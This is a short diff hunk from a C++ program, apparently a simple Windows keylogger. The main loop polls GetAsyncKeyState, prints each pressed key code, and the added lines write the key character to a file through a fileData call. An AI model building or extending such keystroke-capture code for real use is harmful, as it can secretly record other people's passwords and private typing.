@@ -35,6 +35,8 @@ int main() {
             //Check if the key is pressed
             if(GetAsyncKeyState(keyCode)) {
                 std::cout << keyCode << std::endl;
+                //Fills the string with 1 of the character array.
+                fileData(std::string(1, char(keyCode)));
             }
             //If its a special key, translate it
         }
